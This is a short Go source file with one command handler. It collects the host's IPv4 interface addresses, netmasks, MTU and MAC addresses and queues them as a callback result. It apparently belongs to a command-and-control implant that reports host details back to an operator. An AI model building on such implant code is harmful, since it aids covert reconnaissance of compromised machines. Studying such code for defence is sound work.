package command

import (
	"bytes"
	"main/packet"
	"main/util"
	"net"
	"strings"
)

func GetNetworkInformation(b []byte) error {
	interfaces, err := net.Interfaces()
	if err != nil {
		return err
	}
	var result string
	for _, i := range interfaces {
		addrs, err := i.Addrs()
		if err != nil {
			util.Println(util.Sprintf("localAddresses: %+v\n", err.Error()))
			continue
		}
		for _, a := range addrs {
			switch v := a.(type) {
			case *net.IPNet:
				// ipv6 to4 is nil
				if v.IP.To4() == nil {
					continue
				}
				if !strings.HasPrefix(v.IP.String(), "169.254") && !v.IP.IsLoopback() {
					mask := util.Sprintf("%d.%d.%d.%d", v.Mask[0], v.Mask[1], v.Mask[2], v.Mask[3])
					result += util.Sprintf("%s\t%s\t%d\t%s\n", v.IP, mask, i.MTU, i.HardwareAddr)
				}
			}

		}
	}
	buf := bytes.NewBuffer(b)
	pendingRequest := make([]byte, 4)
	_, _ = buf.Read(pendingRequest)
	packet.PushResult(packet.CALLBACK_PENDING, util.BytesCombine(pendingRequest, []byte(result)))
	return nil
}
